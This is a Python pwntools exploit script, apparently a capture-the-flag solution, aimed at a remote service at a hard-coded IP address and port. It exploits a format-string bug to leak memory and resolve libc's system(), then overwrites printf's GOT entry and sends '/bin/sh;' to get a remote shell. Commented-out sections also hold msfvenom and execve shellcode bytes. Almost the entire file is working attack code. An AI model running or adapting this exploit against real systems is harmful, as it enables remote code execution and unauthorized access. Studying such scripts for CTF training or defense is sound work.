#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-26 20:56:33
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
context(log_level="debug")

DEBUG = 0
target = "./pwn"
remote_ip = "54.222.255.223"
port = 50001
# rop = roputils.ROP(target)
# elf = ELF(target)
# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)
# libc = ELF[target]
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"

# int 0x80 linux x86 0x1c
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'

# def exec_fmt(payload):
# 	p = process(target)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	return p.recvuntil(",")[:-1]
# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset

# def send_payload(payload):
# 	sl(payload+"%100000c")
# autofmt = FmtStr(send_payload,offset=offset)

# autofmt.write(free_hook_addr,one_gadget_addr)
# autofmt.execute_writes()



if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	# gdb.attach(p,"b*main\nc")
else:
	context(arch="amd64")
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)



def leakRemoteELF(addr):
	try:
		payload = "%7$s...."+p64(addr)
		if ("\x0a" in payload):
			log.warning("newline in payload!"+str(list(payload)))
			return "\x00"
		# p = remote(remote_ip,port)
		p.recvuntil("emon:")
		p.sendline(payload)
		p.recvuntil(" are : ")
		
		tmp = p.recvuntil("....")[:-4]
		# p.close()
		log.debug("%#x => %s" % (addr, (tmp or '').encode('hex')))
		if tmp == "":
			return "\x00"
		else:
			return tmp
		return "\x00"
	except KeyboardInterrupt:
		raise
	except EOFError:
		raw_input()
		log.debug("got EOF for leaking addr 0x{:x}".format(addr))
		pass
	except Exception:
		log.warning("got exception...", exc_info = sys.exc_info())
	# return "\x00"

def leaklibc(addr):
	addr_start = addr
	print "addr_start="+hex(addr_start)
	# raw_input()
	addr = addr_start
	data = ""
	with open("libc","rb") as f:
		data = f.read()
	data += "\xff"*0x40000
	print "target_add="+hex(addr_start + len(data))
	tmp = leakRemoteELF(addr)

	if tmp[1:4] == "ELF":
		
		print len(data)<1024*1024*1024*2
		raw_input()
		while len(data)<1024*1024*1024*2:
			addr = addr_start + len(data)
			raw_input()
			tmp = leakRemoteELF(addr)
			# if tmp == "\xff":
			# 	break
			data +=tmp
			raw_input()
			with open("libc","wb") as f:
				f.write(data)

def leakELF(addr):
	try:
		payload = "%7$s...."+p64(addr)
		if ("\x0a" in payload):
			log.warning("newline in payload!"+str(list(payload)))
			return "\xff"
		p = remote(remote_ip,port)
		p.recvuntil("emon:")
		p.sendline(payload)
		p.recvuntil(" are : ")
		raw_input()
		tmp = p.recvuntil("....")[:-4]

		p.close()
		if tmp == "":
			return "\x00"
		else:
			return tmp
		return "\xff"
	except KeyboardInterrupt:
		raise
	except EOFError:
		log.debug("got EOF for leaking addr 0x{:x}".format(addr))
		pass
	except Exception:
		log.warning("got exception...", exc_info = sys.exc_info())
	return "\xff"
def leakbin(addr):
	addr_start = addr
	print "addr_start="+hex(addr_start)
	# raw_input()
	addr = addr_start
	data = ""

	while len(data)<4096*4:
		data += leakELF(addr)
		addr = addr_start + len(data)
		with open("libc","wb") as f:
			f.write(data)




# def exec_fmt(payload):
# p = remote(remote_ip,port)
# p.recvuntil("emon:")
# p.sendline(payload)
# p.recvuntil(" are :")
# data = p.recvuntil("[*]")[:-1]
# p.close()
# print data
# return data
# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset
offset = 6

def send_payload(payload):
	# p = remote(remote_ip,port)
	p.recvuntil("emon:")
	p.send(payload[:0x64])
	p.recvuntil(" are : ")
	data = p.recvuntil("[")[:-1]
	# p.close()
	return data

printf_plt = 0x400700
printf_got = 0x601040
read_got = 0x601048
write_got = 0x601020
write_addr = u64(leakRemoteELF(write_got).ljust(8,"\x00"))
read_addr = u64(leakRemoteELF(read_got).ljust(8,"\x00"))
printf_addr = u64(leakRemoteELF(printf_got).ljust(8,"\x00"))
print "read_addr="+hex(read_addr)
print "write_addr ="+hex(write_addr)
print "printf_addr ="+hex(printf_addr)
# raw_input()
# while True:
# 	p = remote(remote_ip,port)
# 	printf_addr = u64(leakRemoteELF(printf_got).ljust(8,"\x00"))
# 	print "printf_addr ="+hex(printf_addr)
# 	leaklibc(int(printf_addr&0xfffffffffff80000))
# 	p.close()
system_addr  = write_addr - (0x000d37c0 -0x0003a220)
bin_sh_addr = write_addr + (0x15a3d1-0x000d37c0)

# print "bin_sh_addr="+hex(bin_sh_addr)
# print leakRemoteELF(bin_sh_addr)

main = 0x4009C9

d = DynELF(leakRemoteELF,main)
# print hex(d.lookup(None,"libc"))
# libc = d.libc
# print libc

system_addr = d.lookup("system","libc")
print "system_addr="+hex(system_addr)
# printf_addr = u64(leakRemoteELF(printf_got).ljust(8,"\x00"))
# print "printf_addr ="+hex(printf_addr)


# print  "system_addr= "+hex(system_addr_)
# print "d.link_map="+hex(d.link_map)
# print "d.elfclass="+str(d.elfclass)
# print "d.dynamic"+hex(d.dynmic)
# print d.bases()
# autofmt = FmtStr(send_payload,offset=offset)
# print leakRemoteELF(0x600E20)
# autofmt.write(0x600E20,system_addr_)
# autofmt.execute_writes()
# stack =  d.stack()
# print leakRemoteELF(stack)

# payload = "%%%dc"%((system_addr>>8)&0xff)+"%8$hhn"
# payload += (0x10-len(payload))*"."+p64(stack)
# payload +=
# payload += "%%%dc"%(len(payload) - (system_addr>>8)&0xff)+"%11$hhn"
# payload +=(0x28-len(payload))*"."+p64(printf_got+1)
# payload = "%22$llX"
# stack_addr = int(send_payload(payload),16)-8
# print "stack_addr="+hex(stack_addr)
# stack =  d.stack()
# system_addr=0x7f42a6c89760
# print "system_addr="+hex(system_addr)
stack_addr = printf_got
# autofmt = FmtStr(send_payload,offset=offset)
# print leakRemoteELF(0x600E20)
# autofmt.write(stack_addr,system_addr)
print leakRemoteELF(stack_addr)

# payload = p64(stack_addr+8)+"%%%dc"%((system_addr)&0xff)+"%6$hhn"
payload =  "%%%dc"%(system_addr>>8 &0xff)+"%9$hhn"
if(system_addr>>8 &0xff) < (system_addr>>16 &0xff):
	# raw_input()
	payload+="%%%dc"%((system_addr>>16&0xff)-(system_addr>>8&0xff))+"%12$hhn"
else:
	payload += "%%%dc"%((0x100+(system_addr>>16&0xff))-(system_addr>>8&0xff))+"%12$hhn"
# payload += "%%%dc"%((0xff+system_addr>>8&0xff)-system_addr&0xff)+"%12$hhn"
payload += (0x18-len(payload))*"."+p64(stack_addr+1)
payload += (0x30-len(payload))*"."+p64(stack_addr+2)
send_payload(payload)
send_payload("/bin/sh;")
# autofmt.write(stack_addr+8,system_addr)
# autofmt.execute_writes()


# print leakRemoteELF(stack)

# print leakRemoteELF(stack_addr)

# write_addr = u64(leakRemoteELF(write_got).ljust(8,"\x00"))
# read_addr = u64(leakRemoteELF(read_got).ljust(8,"\x00"))
# printf_addr = u64(leakRemoteELF(printf_got).ljust(8,"\x00"))
# print "printf_addr ="+hex(printf_addr)
# print "read_addr="+hex(read_addr)
# print "write_addr ="+hex(write_addr)

# print repr(fmtstr_payload(6, {printf_got: (system_addr&0xff)}, write_size='byte'))

p.interactive()
